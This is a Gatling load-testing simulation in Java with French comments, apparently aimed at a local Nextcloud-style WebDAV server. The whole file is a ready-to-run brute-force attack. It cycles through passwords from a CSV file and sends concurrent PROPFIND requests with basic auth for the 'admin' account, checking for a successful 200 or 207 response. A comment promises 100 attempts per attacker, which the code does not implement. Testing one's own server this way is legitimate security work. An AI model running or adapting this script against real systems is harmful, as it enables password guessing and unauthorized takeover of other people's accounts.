package simulations;

import io.gatling.javaapi.core.*;
import io.gatling.javaapi.http.*;
import static io.gatling.javaapi.core.CoreDsl.*;
import static io.gatling.javaapi.http.HttpDsl.*;

public class BruteForce extends Simulation {

    // 1. Configuration HTTP
    HttpProtocolBuilder httpProtocol = http
        .baseUrl("http://localhost:8080")
        .acceptHeader("application/json, text/xml");

    // 2. Chargement du CSV (Circular = on boucle quand on a fini la liste)
    FeederBuilder<String> passwordFeeder = csv("passwords.csv").circular();

    // 3. Le Scénario d'Attaque
    ScenarioBuilder scn = scenario("WebDAV Brute Force Attack")
        .feed(passwordFeeder) // On charge un mot de passe
        .exec(
            http("Tentative de Login WebDAV")
            // On tape sur le dossier de l'admin par défaut
            .httpRequest("PROPFIND", "/remote.php/dav/files/admin/")
            // On essaie l'user "admin" avec le mot de passe du CSV
            .basicAuth("admin", "#{password}")
            // On s'attend à un échec (401) ou une réussite (200/207)
            .check(status().in(200, 207, 401))
        );

    // 4. Injection : 10 attaquants en même temps, 100 essais chacun
    {
        setUp(
            scn.injectOpen(atOnceUsers(10))
        ).protocols(httpProtocol);
    }
}
